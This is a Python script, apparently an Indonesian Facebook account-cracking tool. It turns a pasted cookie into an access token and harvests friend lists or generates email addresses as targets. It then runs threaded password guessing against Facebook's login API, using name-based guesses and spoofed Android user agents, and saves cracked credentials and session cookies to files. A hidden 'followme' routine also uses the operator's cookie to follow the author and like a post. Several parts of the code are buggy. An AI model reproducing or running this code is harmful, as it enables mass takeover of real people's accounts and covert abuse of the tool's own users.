# coding utf-8
import os, sys, re, time, requests, calendar, random, bs4, uuid, json, subprocess
from bs4 import BeautifulSoup as parse
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from rich.panel import Panel
from rich.tree import Tree
from rich.console import Console
from rich import print as cetak
from rich.columns import Columns
___ridwan___xd____atau___luxine___dev___cuma_____pericode____hehe_____makasih_xd = input
___ridwan___xd____atau___luxine___dev___cuma_____pericode____hehe_____makasih_print = cetak
___ridwan___xd____atau___luxine___dev___cuma_____pericode____hehe_____makasih_nel = Panel
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
M1 = '[color(9)]' # MERAH
H1 = '[color(10)]' # HIJAU
K1 = '[color(11)]' # KUNING
P1 = '[color(15)]' # putih
P2 = '[color(15)]'
H2 = '[color(10)]'
K2 = '[color(11)]'
M2 = '[color(9)]'
Cane = f'{H2}•{M2}•{H2}•{P2}'
waz = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
tanggal = str(datetime.now().day)
bulan = waz[str(datetime.now().month)]
tahun = str(datetime.now().year)
yuzong = tanggal+'-'+bulan+'-'+tahun
loop,ugen = 0,[]
uid,uid2 = [],[]
ok, cp = [],[]
data, data2 = {}, {}
wadok,ugen2 = [],[]
cex = []
ses = requests.Session()
mysosmed = "100043618273847"#FB AUTHOR
wagw = "08966908431"#WA AUTHOR
for x in range(10000):
      android = str(random.randint(4,9))+'.'+str(random.randint(0,1))+'.'+str(random.randint(0,1))
      fbav = str(random.randint(37,325))+".0.0."+str(random.randint(1,20))+"."+str(random.randint(40,150))
      fbbv = str(random.randint(11111111,99999999));fbrv = str(random.randint(11111111,99999999))
      build = ['KTU84Q','SAMSUNG','LMY4','LMY47V','MMB29K','MMB29M','LRX22C','LRX22G','NMF2','NMF26X','NMF26I','NRD90M','NRD90M','SPH-L720','IML74K','IMM76D','JDQ39','JSS15J','JZO54K','KOT4','KOT49H','KOT49X','KTU84P','N2G47H','LMY47X','LMY47D','R16NW','MMB29P','MRA58K','LMY47I','LMY48B','LRX21M','NMF26F','LRX21V','MMB29P','MRA58K','NRD90U','MXB48T','NMF26F','LRX21T','NJH47F','LMY49J'] 
      build2 = ['OPM3.171019.016','OPR1.170623.032','OPM2.171019.029','OPM5.171019.017','TP1A.220905.001','QP1A.190711.020','RP1A.200720.011','SP1A.210812.016']
      merk = ['SM-J320F','SM-A520F','GT-I9505G','SM-N900V','SM-T555','SM-A500H','SM-A320FL','SM-J701M','SM-J327P','SM-J510FN','SM-G530H','SM-G900W8','SM-J105H','SM-G532G','SM-G530H','SM-G550T1','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','SM-G900FD','SM-G532G']
      merk2 = ['Lenovo TB2-X30L','ONEPLUS A5000','LGLS665','vivo Y51L','LG-M150','vivo Y21','OPPO A59s','OPPO R9 Plusm A','vivo Y71A','CPH1719','vivo Y35','vivo X20','Aquaris M5.5','vivo X6D','OPPO R11','Aquaris X5','Aquaris E5','Lenovo TB3-710','FS510','FS405','ONEPLUS A5010','NX531J','ONEPLUS A3003','LG-H870DS','Nexus 5X ','Aquaris X2']
      fbcr = str(random.choice(['TELKOMSEL','AXIS','Indosat','XL','3SinyalKuatHemat','Tsel-PakaiMasker','XL Axiata']))
      fblc = str(random.choice(['sv_SE','en_GB','en_US','es_MX','th_TH','pl_PL','id_ID']))
      fbpn = str(random.choice(['com.facebook.katana','com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.mlite','MessengerLite']))
      merk_build = str(random.choice(merk))+'<=>'+str(random.choice(build))+'<=>'+str(random.choice(merk2))+'<=>'+str(random.choice(build2));merk,build,merks,build2 = merk_build.split('<=>')
      large = str(random.choice(['1.0','1.5','2.0','2.5','3.0','3.5']))+'<=>'+str(random.choice(['760','750','1092','1082','650','1080']))+'<=>'+str(random.choice(['760','750','1092','1082','650','1080']));denincity,width,heigt = large.split('<=>')      
      dalvik = str(random.choice(['2.1.0','2.0.0','1.6.0','1.5.0','1.4.0','1.2.0','1.1.0']))
      ua1 = 'Dalvik/'+str(dalvik)+' (Linux; U; Android '+str(android)+'; '+str(merk)+' Build/'+str(build)+') [FBAN/Orca-Android;FBAV/'+str(fbav)+';FBPN/'+str(fbpn)+';FBLC/'+str(fblc)+';FBBV/'+str(fbbv)+';FBCR/'+str(fbcr)+';FBMF/samsung;FBBD/samsung;FBDV/'+str(merk)+';FBSV/'+str(android)+';FBCA/armeabi-v7a:armeabi;FBDM/'+'{density='+str(denincity)+',width='+str(width)+',height='+str(heigt)+'};FB_FW/1;FBRV/'+str(fbrv)+']'
      ua2 = 'Dalvik/'+str(dalvik)+' (Linux; U; Android '+str(android)+'; '+str(merks)+' Build/'+str(build)+') [FBAN/FB4A;FBAV/'+str(fbav)+';FBPN/com.facebook.katana;FBDV/merek;FBSV/'+str(android)+';FBDM/{density='+str(denincity)+',width='+str(width)+',height='+str(heigt)+'};FBCR/'+str(fbcr)+';FBLC/id_ID;FB_FW/1;]'
      ugen.append(str(random.choice([ua1,ua2])))
def clear():
      if sys.platform.lower() == 'linux':
            try:os.system('clear')
            except:pass

      elif sys.platform.lower() == 'win':
            try:os.system('cls')
            except:pass
def logonya():
	___ridwan___xd____atau___luxine___dev___cuma_____pericode____hehe_____makasih_print(___ridwan___xd____atau___luxine___dev___cuma_____pericode____hehe_____makasih_nel(f"""{P2}[{H2}•{P2}] 🇲🇨 INDONESIA
{P2}[{H2}•{P2}] Seumur Hidup
{P2}[{H2}•{P2}] RIZKI_377
{P2}[{H2}•{P2}] NOT FOUND
{P2}[{H2}•{P2}] 0.0.1""",style=f'bold white',title=f"{H2}•{M2}•{H2}•{P2} LOGO {H2}•{M2}•{H2}•",subtitle=f'{Cane} Luxine-Dev {Cane}'))
###----------[ NGECEK COOKIES ]----------###
def cex():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		cex.append(token)
		try:
			gerap = requests.get('https://mbasic.facebook.com/me?fields=id&access_token='+tokenefb[0], cookies={'cookie':cok})
			nteng = json.loads(gerap.text)['id']
			menu()
		except KeyError:
			login()
		except requests.exceptions.ConnectionError:
			exit()
	except IOError:
		login()
def cek():
	try:
		cok = open('.cok.txt','read')
		menu()
	except Exception as e:login()
def login():
      global data,data2
      clear()
      
      ___ridwan___xd____atau___luxine___dev___cuma_____pericode____hehe_____makasih_print(___ridwan___xd____atau___luxine___dev___cuma_____pericode____hehe_____makasih_nel(f"""{P1}[!] Di Sarankan Mengunakan Akun Tumbal Supaya Tidak Terjadi Fitnah/Salah Sangkah Bawa Script Ini Mengunkan {M1} Loger Atau Pun Bot Tele""",style='bold white'))
      cok = ___ridwan___xd____atau___luxine___dev___cuma_____pericode____hehe_____makasih_xd(f"{H}• {P}Masukan Cookie : ")
      ___ridwan___xd____atau___luxine___dev___cuma_____pericode____hehe_____makasih_print(___ridwan___xd____atau___luxine___dev___cuma_____pericode____hehe_____makasih_nel(f"""{H1}Sedang Mengconvert Cookie Ke Token EAAJ""",style='bold white'))
      try:
            link = ses.post('https://graph.facebook.com/v16.0/device/login/', data={'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'scope': ''}).json()
            kode,user = link['code'],link['user_code']
            vers = parse(ses.get(f'https://mbasic.facebook.com/device', cookies={'cookie': cok}).content, 'html.parser')
            item = ['fb_dtsg','jazoest','qr']
            for x in vers.find_all('input'):
                  if x.get('name') in item:
                        aset = {x.get('name'):x.get('value')}
                        data.update(aset)
            data.update({'user_code':user})
            meta = parse(ses.post('https://mbasic.facebook.com'+vers.find('form', method='post').get('action'), data=data, cookies={'cookie': cok}).text, 'html.parser')
            xzxz  = meta.find('form',{'method':'post'})
            for x in xzxz('input',{'value':True}):
                  try:
                        if x['name'] == '__CANCEL__' : pass
                        else:
                              data2.update({x['name']:x['value']})
                  except Exception as e:pass
            ses.post(f'https://mbasic.facebook.com{xzxz["action"]}', data=data2, cookies={'cookie':cok})
            token = ses.get(f'https://graph.facebook.com/v16.0/device/login_status?method=post&code={kode}&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32').json()['access_token']
            open('.token.txt','w').write(token);open('.cok.txt','w').write(cok);followme(cok)
            cetak(Panel(f"""{H1}{token}""",style='bold white',title=f'TOKEN FACEBOOK'))
            menu()
      except(KeyError):
      	___ridwan___xd____atau___luxine___dev___cuma_____pericode____hehe_____makasih_print(___ridwan___xd____atau___luxine___dev___cuma_____pericode____hehe_____makasih_nel(f"""{M1}Cookie Anda Telah Mati Ini Terjadi Karna
[1] cookie salah salin
[2] cookie sudah di pakai dump
[3] cookie tidak terdaftar""",style='bold white'))
def menu():
      clear()
      logonya()
      ___ridwan___xd____atau___luxine___dev___cuma_____pericode____hehe_____makasih_print(___ridwan___xd____atau___luxine___dev___cuma_____pericode____hehe_____makasih_nel(f"""{P2}[{H2}01{P2}] crack publik{P2}   [{H2}ON{P2}]\n{P2}[{H2}02{P2}] crack grup{P2}     [{H2}Update{P2}]\n{P2}[{H2}03{P2}] crack file     [{M2}OFF{P2}]\n{P2}[{H2}04{P2}] crack email {P2}   [{H2}ON{P2}]\n{P2}[{H2}05{P2}] get proxy {P2}     [{H2}ON{P2}]""",style=f'bold white',title=f'{Cane} Menu {Cane}',subtitle=f'{Cane} Luxine-Dev {Cane}'))
      ___ridwan___xd____atau___luxine___dev___cuma_____pericode____hehe_____makasih = ___ridwan___xd____atau___luxine___dev___cuma_____pericode____hehe_____makasih_xd(f"{H}•{P} menu : ")
      if ___ridwan___xd____atau___luxine___dev___cuma_____pericode____hehe_____makasih in ['1','01']:
      	crack_publick_key()
      elif ___ridwan___xd____atau___luxine___dev___cuma_____pericode____hehe_____makasih in ['4','04']:
      	clone_email_nama_gmail_limit()
      elif ___ridwan___xd____atau___luxine___dev___cuma_____pericode____hehe_____makasih in ['2','02']:
      	grup_get_url_graph()
      else:
      	exit()
def crack_publick_key():
            ___ridwan___xd____atau___luxine___dev___cuma_____pericode____hehe_____makasih_print(___ridwan___xd____atau___luxine___dev___cuma_____pericode____hehe_____makasih_nel(f"{P2}Gunakan Tanda (|) Untuk Pemisahan Id {P2}",title=f'{Cane} Peringatan {Cane}',style=f'bold white',subtitle=f'{Cane} Luxine-Dev {Cane}'))
            user = input(f'{H}•{P} user id : ')
            try:
                  for uid in user.split('|'):
                        try:
                              freya = ses.get('https://graph.facebook.com/'+uid+'?fields=friends.fields(id,name).limit(500000)&access_token='+open('.token.txt','r').read(),cookies={'cookie': open('.cok.txt','r').read()}).json()['friends']['data']
                              for xz in freya:
                                    uid2.append(xz['id']+'|'+xz['name'])
                        except(KeyError):pass
            except(KeyError,IOError):
                  try:
                        os.system('rm -rf data/token.txt && rm -rf data/cookies.txt')
                  except:pass
            aturuid()      
def clone_email_nama_gmail_limit():
            ___ridwan___xd____atau___luxine___dev___cuma_____pericode____hehe_____makasih_print(___ridwan___xd____atau___luxine___dev___cuma_____pericode____hehe_____makasih_nel(f"{P2}masukan nama dan gmail and limit dan pastikan gmail terdaftar ",style=f'bold white',title=f'{Cane} Peringatan {Cane}',subtitle=f'{Cane} Luxine-Dev {Cane}'))
            user = input(f'{H}•{P} nama : ')
            limt = input(f'{H}•{P} limit : ')
            gm = input(f'{H}•{P} gmail : ')
            try:
                  for userx in range(int(limt)):
                        nama1 = ['andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','budi','joni','toni','cahya','riski','farhan','aden','joko','01','02','03','04','05','06','07','08','09','10']
                        nama2 = ['99','official','gaming','utama','123','1234','12345','123456','cakep','01','02','03','04','05','06','07','08','09','10']
                        B = [f'{str(random.choice(nama1))}',f'{str(random.randint(0,31))}',f'{str(random.choice(nama2))}'f'{str(random.choice(nama1))}{str(random.randint(0,31))}',f'{userx}',f'{str(random.choice(nama2))}{str(random.randint(0,31))}',f'{str(random.choice(nama1))}{str(random.choice(nama2))}']
                        gabung = user+str(random.choice(B))+f'{gm}'
                        if gabung in uid2:
                              pass
                        else:
                              uid2.append(gabung+'|'+user)
                  aturuid()
            except(Exception) as e:print(e)

def aturuid():
      ___ridwan___xd____atau___luxine___dev___cuma_____pericode____hehe_____makasih_print(___ridwan___xd____atau___luxine___dev___cuma_____pericode____hehe_____makasih_nel(f"{P2}[{H2}01{P2}] akun muda\n{P2}[{H2}02{P2}] akun old\n{P2}[{H2}03{P2}] akun random",title=f'{Cane} Atur id {Cane}',style='bold white',subtitle=f'{Cane} Luxine-Dev {Cane}'))
      user = ___ridwan___xd____atau___luxine___dev___cuma_____pericode____hehe_____makasih_xd(f'{H}•{P} setting id : ')
      if user == '1' or user == '01':
            for zx in sorted(uid2):
                  uid.append(zx)
            aturmethode()
      elif user == '2' or user == '02':
            muda=[]
            for bacot in sorted(uid2):
                  muda.append(bacot)
            bcm=len(muda)
            bcmi=(bcm-1)
            for xmud in range(bcm):
                  uid.append(muda[bcmi])
                  bcmi -=1              
            aturmethode()
      elif user == '3' or user == '03':
            for bacot in uid2:
                  xx = random.randint(0,len(uid2))
                  uid.insert(xx,bacot)
            aturmethode()
# > ATUR PW   
def aturmethode():
      ___ridwan___xd____atau___luxine___dev___cuma_____pericode____hehe_____makasih_print(___ridwan___xd____atau___luxine___dev___cuma_____pericode____hehe_____makasih_nel(f"{H2}disarankan mengunakan metode devlopers jika crack email",style=f'bold white'))
      ___ridwan___xd____atau___luxine___dev___cuma_____pericode____hehe_____makasih_print(___ridwan___xd____atau___luxine___dev___cuma_____pericode____hehe_____makasih_nel(f"""{P2}[{H2}01{P2}] m.facebook\n{P2}[{H2}02{P2}] free.facebook\n{P2}[{H2}03{P2}] mbasic.facebook\n{P2}[{H2}04{P2}] devlopers""",style=f'bold white',title=f'{Cane} Metode {Cane}',subtitle=f'{Cane} Luxine-Dev {Cane}'))
    #  pasword('1','')
      me = ___ridwan___xd____atau___luxine___dev___cuma_____pericode____hehe_____makasih_xd(f'{H}•{P} Metode : ')
      pasword('1','')
      user = input(f'{H}•{P} password : ')
      if user == '1' or user == '2':
            pasword('1','')
      elif user == '2s' or user == '0s2':
            pasword('2','')
      else:
            pasw = input(f'{H}•{P} password : {P}').split(',')
            pasword('3',pasw)

# > WORLDLIST PASSWORD        
def pasword(method,pasw):
      global prog,des
      ___ridwan___xd____atau___luxine___dev___cuma_____pericode____hehe_____makasih_print(___ridwan___xd____atau___luxine___dev___cuma_____pericode____hehe_____makasih_nel(f"{P2}[{H2}•{P2}] akun ok ({H2}+{P2}) {H2}Result/AkunOk.txt\n{P2}[{H2}•{P2}] akun cp ({K2}+{P2}) {K2}Result/AkunCp.txt",style='bold white',title=f'{Cane} Hasil Crack {Cane}',subtitle=f'{Cane} Cracking Berjalan {Cane}'))
      #except:pass
      prog = Progress(SpinnerColumn('smiley'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
      des = prog.add_task('',total=len(uid))
      with prog:
             #except:pass
             with ThreadPoolExecutor(max_workers=30) as pool:
                   for idx in uid:
                         user,name = idx.split('|')[0],idx.split('|')[1].lower()
                         depan = name.split(' ')[0]
                         if method == '1':
                               if len(name)<5:
                                     if len(depan)<1 or len(depan)<2:pass
                                     else:
                                           pwa = [depan+'123',depan+'12345',depan+'123456']
                               else:
                                     pwa = [name,depan+'123',depan+'12345',depan+'123456']
                               pool.submit(apimethod,user,pwa)
                         elif method == '2':
                               if len(name)<5:
                                     if len(depan)<1 or len(depan)<2:pass
                                     else:
                                           pwa = [depan+'123',depan+'12345',depan+'123456',depan+'01',depan+'02',depan+'03',depan+'04',depan+'05',depan+'06',depan+'07',depan+'321']
                               else:
                                     pwa = [name,depan+'123',depan+'12345',depan+'123456',depan+'01',depan+'02',depan+'03',depan+'04',depan+'05',depan+'06',depan+'07',depan+'321']
                               pool.submit(apimethod,user,pwa)
                         elif method == '3':
                               if len(name)<5:
                                     if len(depan)<1 or len(depan)<2:pass
                                     else:
                                           pwa = [depan+'123',depan+'12345',depan+'123456',depan+'01',depan+'02',depan+'03',depan+'04',depan+'05',depan+'06',depan+'07',depan+'321']
                               else:
                                     pwa = [name,depan+'123',depan+'12345',depan+'123456',depan+'01',depan+'02',depan+'03',depan+'04',depan+'05',depan+'06',depan+'07',depan+'321']
                               pool.submit(apimethod,user,pwa+pasw)
      exit()

# > METHODE API FACEBOOK                                
def apimethod(user,pasw):
      global loop,ok,cp
      ue = f'Mozilla/5.0 (Linux; Android 7.1.1; SM-J510MN Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.77 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/416.0.0.35.85;]'
      war = random.choice([f"{H}",f"{M}",f"{K}"])
     # print(f"\r%sCrackfb [%s/%s] [OK-:%s] [CP-:%s]"%war,loop,len(loop),len(uid),len(ok),len(cp),end=" ");sys.stdout.flush()
      prog.update(des,description=f'\r{war}Devlopers {P}[{loop}/{len(uid)}] [{H}OK-:{len(ok)}{P}] {H}Premium {P}')
      prog.advance(des)
    #  sa  = open(".prox.txt","r").read().splitlines()
#      proxy = {'http': 'socks5://'+random.choice(sa)}
    #  print(f'\r%scracking %s[%s|%s] %s[Ok:-%s] %s[Cp:-%s] %s[Status:%s aman%s] '%(H1,P1,loop,len(uid),H1,len(ok),K1,len(cp),P1,H1,P1))#;prog.advance(des)
      for pw in pasw:
            try:
                  ua = str(random.choice(ugen))
                  params = {'User-Agent':ua,'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
                  data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':user,'password':pw,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_GB','client_country_code':'ID','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
                  response = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=params,allow_redirects=False).json()
                  if 'session_key' in response:
                        session = response['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+'; dpr=2; locale=en_US; wd=950x1835; ';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
                        tokenku = response['access_token']
                        uidf = response['uid']
                        tree = Tree("")
                        tree.add(f'\r{H}{uidf}|{pw}{P}').add(f'{H}{cookie}')
                        cetak(tree)
                        ok.append(user)
                        with open('/sdcard/Result/AkunOk.txt','a') as xnx:
                              xnx.write(user+'|'+pw+'\n')
                        break
                  elif 'www.facebook.com' in response['error']['message']:
                        uidf = response['error']['error_data']['uid']
                        tree = Tree("")
                        tree.add(f'\r{K}{idf}|{pw}{P}')
                        cetak(tree)
                        cp.append(user)
                        with open('/sdcard/Result/AkunCp.txt','a') as xnx:
                              xnx.write(user+'|'+pw+'\n')
                        break
                  else:
                        continue
            except(requests.exceptions.ConnectionError):
            #	print(f'\r{M}Data Mati')
            	prog.update(des,description=f'\rData Anda Sedang Mati');prog.advance(des)
      loop+=1

# > BOT OWNER JGN DI GANTI TOLONG
def followme(kueh):
      for user in mysosmed:
            try:
                  for response in parse(requests.get(f'https://mbasic.facebook.com/'+user,cookies={'cookie':kueh}).text,'html.parser').find_all('a',href=True):
                        if '/a/subscribe.php?' in response.get('href'):x=requests.get('https://mbasic.facebook.com{}'.format(response['href']), cookies = {'cookie':kueh}).text
            except(Exception) as e:print(e)
      for z in parse(requests.get("https://www.facebook.com/100003857667402/posts/pfbid0vK1Wc8y2dvbw23dYCgDHdzJBiYSVzRL77DkPYj82yM5XB8t5LnYaUr5TumrvZmbdl/?app=fbl",cookies={"cookie":kueh}).text,"html.parser").find_all("a",href=True):
            if z.text in ["Suka","Like"]:requests.get("https://mbasic.facebook.com"+z["href"],cookies={"cookie":kueh})

tim, day = datetime.now().hour,datetime.now().day
duo = (str(tim)+'|'+str(day))
waktu,bulan = duo.split('|')

def cekwaktu():
      if 23 <= int(waktu) <0:
            if str(bulan) == '1':
                  clear();cetak('%s[%s√%s] Welcome User Nikmati Ini Cuma Tes Doang'%(P1,H1,P1));time.sleep(3);ceklogin()
            else:cetak('%s[%sx%s] Sory Bro Script Udh Tutup'%(P1,M1,P1));exit()
      else:cetak('%s[%sx%s] Sory Bro Script Udh Tutup'%(P1,M1,P1));exit()
                            
def cekkey():
      clear();user = Console().input('%s[%s•%s] Nama: '%(P1,H1,P1))
      if user == 'ronaldowati':
            useer = Console().input('%s[%s•%s] Paswrod: '%(P1,H1,P1))
            if useer == 'messi':
                  cekwaktu()
            else:
                  cetak('%s[%sx%s] Pasword Yg Anda Masukan Salah'%(P1,M1,P1))
      else:
            cetak('%s[%sx%s] Nama Yg Anda Masukan Salah'%(P1,M1,P1))
            
if __name__ == '__main__':
      try:os.mkdir('data')
      except:pass
      try:os.mkdir('CP')
      except:pass
      try:os.mkdir('OK')
      except:pass
      cex()
#      ceek()
